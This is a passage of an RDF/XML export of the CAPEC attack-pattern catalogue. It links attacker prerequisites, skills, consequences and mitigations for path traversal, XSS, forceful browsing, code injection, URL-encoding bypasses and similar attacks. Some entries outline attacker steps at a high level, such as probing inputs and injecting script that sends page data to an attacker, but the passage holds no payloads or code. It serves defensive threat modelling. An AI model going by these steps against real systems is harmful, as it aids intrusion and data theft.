    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The target must be misconfigured to return a list of a directory&apos;s content when it receives a request that ends in a directory name rather than a file name.::The adversary must be able to control the path that is requested of the target.::The administrator must have failed to properly configure an ACL or has associated an overly permissive ACL with a particular directory.::The server version or patch level must not inherently prevent known directory listing attacks from working.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:To issue the request to URL without given a specific file name:LEVEL:Low::SKILL:To bypass the access control of the directory of listings:LEVEL:High::"/>
    </j.0:need>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::Ability to send HTTP requests to a web application.::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker208">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#597">
        <j.0:relatedPattern>
          <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:126::"/>
        </j.0:relatedPattern>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#Absolute Path Traversal"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack208">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#597"/>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::36::"/>
        </j.0:exploits>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:Integrity:SCOPE:Confidentiality:SCOPE:AvailabilityTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Integrity Confidentiality Availability Execute Unauthorized Commands The attacker may be able to create or overwrite critical files that are used to execute code  such as programs or libraries.::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data:NOTE:Integrity Modify Data The attacker may be able to overwrite or create critical files  such as programs  libraries  or important data. If the targeted file is used for a security mechanism  then the attacker may be able to bypass that mechanism. For example  appending a new account at the end of a password file may allow an attacker to bypass authentication.::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data:NOTE:Confidentiality Read Data The attacker may be able read the contents of unexpected files and expose sensitive data. If the targeted file is used for a security mechanism  then the attacker may be able to bypass that mechanism. For example  by reading a password file  the attacker could conduct brute force password guessing attacks in order to break into an account on the system.::SCOPE:AvailabilityTECHNICAL IMPACT:Unreliable Execution:NOTE:Availability Unreliable Execution The attacker may be able to overwrite  delete  or corrupt unexpected critical files such as programs  libraries  or important data. This may prevent the software from working at all and in the case of a protection mechanisms such as authentication  it has the potential to lockout every user of the software.::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::36::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The target must leverage and access an underlying file system.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:Simple command line attacks.:LEVEL:Low::SKILL:Programming attacks.:LEVEL:Medium::"/>
    </j.0:need>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::The attacker must have access to an application interface or a direct shell that allows them to inject directory strings and monitor the results.::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker46">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#209"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack46"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::79::20::646::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The victim must follow a crafted link that references a scripting file that is mis-typed as a non-executable file.::The victim&apos;s browser must detect the true type of a mis-labeled scripting file and invoke the appropriate script interpreter without first performing filtering on the content.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::The adversary must have the ability to source the file of the incorrect MIME type containing a script.::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker511">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#551">
        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:542::"/>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#Modify Existing Service"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack511">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#551"/>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::284::522::"/>
        </j.0:exploits>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::284::522::"/>
    <j.0:precondition rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker207">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#638"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack207"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:precondition rdf:resource="http://krstProj.com/capec#::Advanced knowledge about the installed target system design.::Advanced knowledge about the download and update installation processes.::Access to the download and update system(s) used to deliver BIOS images.::"/>
    <j.0:need rdf:resource="http://krstProj.com/capec#::SKILL:Able to develop a malicious BIOS image with the original functionality as a normal BIOS image  but with added functionality that allows for later compromise and/or disruption.:LEVEL:High::"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker45">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#544"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack45"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:precondition rdf:resource="http://krstProj.com/capec#::None::"/>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker510">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#550">
        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:542::"/>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#Install New Service"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack510">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#550"/>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#::284::"/>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::284::"/>
    <j.0:precondition rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker48">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#568"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack48"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The ability to install the keylogger  either in person or remote.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Design: Use browser technologies that do not allow client side scripting.::Design: Utilize strict type  character  and encoding enforcement::Design: Server side developers should not proxy content via XHR or other means  if a http proxy for remote content is setup on the server side  the client&apos;s browser has no way of discerning where the data is originating from.::Implementation: Ensure all content that is delivered to client is sanitized against an acceptable content specification.::Implementation: Perform input validation for all remote content.::Implementation: Perform output validation for all remote content.::Implementation: Session tokens for specific host::Implementation: Patching software. There are many attack vectors for XSS on the client side and the server side. Many vulnerabilities are fixed in service packs for browser  web servers  and plug in technologies  staying current on patch release that deal with XSS countermeasures mitigates this.::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack55">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#63">
            <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:242::"/>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#High"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Very High"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#Cross-Site Scripting (XSS)"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::79::20::"/>
        </j.0:exploits>
        <j.0:executes>
          <j.0:ExecutionFlow rdf:about="http://krstProj.com/capec#::STEP:1:PHASE:Explore:DESCRIPTION:(Survey the application for user-controllable inputs) Using a browser or an automated tool  an attacker follows all public links and actions on a web site. He records all the links  the forms  the resources accessed and all other potential entry-points for the web application.TECHNIQUE:Use a spidering tool to follow and record all links and analyze the web pages to find entry points. Make special note of any links that include parameters in the URL.:TECHNIQUE:Use a proxy tool to record all links visited during a manual traversal of the web application.:TECHNIQUE:Use a browser to manually explore the website and analyze how it is constructed. Many browsers&apos; plugins are available to facilitate the analysis or automate the discovery.::STEP:2:PHASE:Experiment:DESCRIPTION:(Probe identified potential entry points for XSS vulnerability) The attacker uses the entry points gathered in the Explore phase as a target list and injects various common script payloads to determine if an entry point actually represents a vulnerability and to characterize the extent to which the vulnerability can be exploited.TECHNIQUE:Use a list of XSS probe strings to inject script in parameters of known URLs. If possible  the probe strings contain a unique identifier.:TECHNIQUE:Use a proxy tool to record results of manual input of XSS probes in known URLs.:TECHNIQUE:Use a list of XSS probe strings to inject script into UI entry fields. If possible  the probe strings contain a unique identifier.:TECHNIQUE:Use a list of XSS probe strings to inject script into resources accessed by the application. If possible  the probe strings contain a unique identifier.::STEP:3:PHASE:Exploit:DESCRIPTION:(Steal session IDs  credentials  page content  etc.) As the attacker succeeds in exploiting the vulnerability  he can choose to steal user&apos;s credentials in order to reuse or to analyze them later on.TECHNIQUE:Develop malicious JavaScript that is injected through vectors identified during the Experiment Phase and loaded by the victim&apos;s browser and sends document information to the attacker.:TECHNIQUE:Develop malicious JavaScript that injected through vectors identified during the Experiment Phase and takes commands from an attacker&apos;s server and then causes the browser to execute appropriately.::STEP:4:PHASE:Exploit:DESCRIPTION:(Forceful browsing) When the attacker targets the current application or another one (through CSRF vulnerabilities)  the user will then be the one who perform the attacks without being aware of it. These attacks are mostly targeting application logic flaws  but it can also be used to create a widespread attack against a particular website on the user&apos;s current network (Internet or not).TECHNIQUE:Develop malicious JavaScript that is injected through vectors identified during the Experiment Phase and loaded by the victim&apos;s browser and performs actions on the same web site:TECHNIQUE:Develop malicious JavaScript that injected through vectors identified during the Experiment Phase and takes commands from an attacker&apos;s server and then causes the browser to execute request to other web sites (especially the web applications that have CSRF vulnerabilities).::STEP:5:PHASE:Exploit:DESCRIPTION:(Content spoofing) By manipulating the content  the attacker targets the information that the user would like to get from the website.TECHNIQUE:Develop malicious JavaScript that is injected through vectors identified during the Experiment Phase and loaded by the victim&apos;s browser and exposes attacker-modified invalid information to the user on the current web page.::"/>
        </j.0:executes>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Confidentiality Integrity Availability Execute Unauthorized Commands Run Arbitrary Code::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker516">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#434"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack516"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:precondition rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker47">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#154"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack47"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::None. All applications rely on file paths and therefore  in theory  they or their resources could be affected by this type of attack.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#::None: No specialized resources are required to execute this type of attack.::"/>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Authenticate request to every resource. In addition  every page or resource must ensure that the request it is handling has been made in an authorized context.::Forceful browsing can also be made difficult to a large extent by not hard-coding names of application pages or resources. This way  the attacker cannot figure out  from the application alone  the resources available from the present context.::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack242">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#87">
            <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:115::"/>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#High"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#Forceful Browsing"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::425::285::693::"/>
        </j.0:exploits>
        <j.0:executes>
          <j.0:ExecutionFlow rdf:about="http://krstProj.com/capec#::STEP:1:PHASE:Explore:DESCRIPTION:(Spider) Using an automated tool  an attacker follows all public links on a web site. He records all the links he finds.TECHNIQUE:Use a spidering tool to follow and record all links.:TECHNIQUE:Use a proxy tool to record all links visited during a manual traversal of the web application.::STEP:2:PHASE:Experiment:DESCRIPTION:(Attempt well-known or guessable resource locations) Using an automated tool  an attacker requests a variety of well-known URLs that correspond to administrative  debugging  or other useful internal actions. He records all the positive responses from the server.TECHNIQUE:Use a spidering tool to follow and record attempts on well-known URLs.:TECHNIQUE:Use a proxy tool to record all links visited during a manual traversal of attempts on well-known URLs.::STEP:3:PHASE:Exploit:DESCRIPTION:(Use unauthorized resources) By visiting the unprotected resource  the attacker makes use of unauthorized functionality.TECHNIQUE:Access unprotected functions and execute them.::STEP:4:PHASE:Exploit:DESCRIPTION:(View unauthorized data) The attacker discovers and views unprotected sensitive data.TECHNIQUE:Direct request of protected pages that directly access database back-ends. (e.g.  list.jsp  accounts.jsp  status.jsp  etc.)::"/>
        </j.0:executes>
        <j.0:implies rdf:resource="http://krstProj.com/capec#::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Bypass Protection Mechanism::"/>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker515">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#435"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack515"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:precondition rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Design: Ensure that client process and/or message is authenticated so that anonymous communications and/or messages are not accepted by the system.::Design: Do not rely on client validation or encoding for security purposes.::Design: Utilize digital signatures to increase authentication assurance.::Design: Utilize two factor authentication to increase authentication assurance.::Implementation: Perform input validation for all remote content.::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack218">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#22">
            <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#null"/>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#High"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Meta"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#Exploiting Trust in Client"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::290::287::20::200::693::"/>
        </j.0:exploits>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Confidentiality Integrity Availability Execute Unauthorized Commands Run Arbitrary Code::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker49">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#542"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack49"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:precondition rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker514">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#579"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack514"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:precondition rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker468">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#64">
        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:267::"/>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#High"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#Using Slashes and URL Encoding Combined to Bypass Validation Logic"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack468">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#64"/>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::177::171::173::172::73::21::22::74::20::697::707::"/>
        </j.0:exploits>
        <j.0:executes>
          <j.0:ExecutionFlow rdf:about="http://krstProj.com/capec#::STEP:1:PHASE:Explore:DESCRIPTION:The attacker accesses the server using a specific URL.::STEP:2:PHASE:Experiment:DESCRIPTION:The attacker tries to encode some special characters in the URL. The attacker find out that some characters are not filtered properly.::STEP:3:PHASE:Exploit:DESCRIPTION:The attacker crafts a malicious URL string request and sends it to the server.::STEP:4:PHASE:Exploit:DESCRIPTION:The server decodes and interprets the URL string. Unfortunately since the input filtering is not done properly  the special characters have harmful consequences.::"/>
        </j.0:executes>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:AvailabilityTECHNICAL IMPACT:Resource Consumption:NOTE:Availability Resource Consumption Denial of Service::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Confidentiality Integrity Availability Execute Unauthorized Commands Run Arbitrary Code::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::177::171::173::172::73::21::22::74::20::697::707::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The application accepts and decodes URL string request.::The application performs insufficient filtering/canonicalization on the URLs.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:An attacker can try special characters in the URL and bypass the URL validation.:LEVEL:Low::SKILL:The attacker may write a script to defeat the input filtering mechanism.:LEVEL:Medium::"/>
    </j.0:need>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Utilize strict type  character  and encoding enforcement::Ensure all input content that is delivered to client is sanitized against an acceptable content specification.::Perform input validation for all content.::Enforce regular patching of software.::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack88">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#242">
            <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#null"/>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#High"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Stable"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Meta"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#Code Injection"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::94::"/>
        </j.0:exploits>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Other:NOTE:Confidentiality Integrity Availability Other Code Injection attack patterns can result in a wide variety of consequences and negatively affect all three elements of the security triad.::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker335">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#164"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack335"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::Attacker needs mobile phone numbers to initiate the connection. The attacker must guess an area of interest for the mobile user to entice them to follow the link provided in the text message. The attacker must have a replicated web site as in a normal Phishing attack.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::Either mobile phone or access to a web resource that allows text messages to be sent to mobile phones. Resources needed for regular Phishing attack.::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker202">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#305"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack202"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::200::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The adversary requires logical access to the target network. ACK scanning requires the use of raw sockets  and thus cannot be performed from some Windows systems (Windows XP SP 2  for example). On Unix and Linux  raw socket manipulations require root privileges.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::This attack can be achieved via the use of a network mapper or scanner  or via raw socket programming in a scripting language. Packet injection tools are also useful for this purpose. Depending upon the method used it may be necessary to sniff the network in order to see the response.::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker334">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#111"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack334"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::345::346::352::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::JSON is used as a transport mechanism between the client and the server::The target server cannot differentiate real requests from forged requests::The JSON object returned from the server can be accessed by the attackers&apos; malicious code via a script tag::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:Once this attack pattern is developed and understood  creating an exploit is not very complex.The attacker needs to have knowledge of the URLs that need to be accessed on the target system to request the JSON objects.:LEVEL:Medium::"/>
    </j.0:need>
    <j.0:uses rdf:resource="http://krstProj.com/capec#::None: No specialized resources are required to execute this type of attack.::"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker467">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#79">
        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:267::"/>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#High"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#Using Slashes in Alternate Encoding"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack467">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#79"/>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::173::171::180::181::20::74::73::21::22::185::200::697::707::"/>
        </j.0:exploits>
        <j.0:executes>
          <j.0:ExecutionFlow rdf:about="http://krstProj.com/capec#::STEP:1:PHASE:Experiment:DESCRIPTION:The attacker has access to a resource path and required to use slashes as resource delimiter.::STEP:2:PHASE:Experiment:DESCRIPTION:The attacker tries variation and combination of the slashes characters in different encoding format.::STEP:3:PHASE:Experiment:DESCRIPTION:The attacker found an unfiltered combination which maps to a valid path and accesses unauthorized resources (directories  files  etc.)::"/>
        </j.0:executes>
        <j.0:implies>
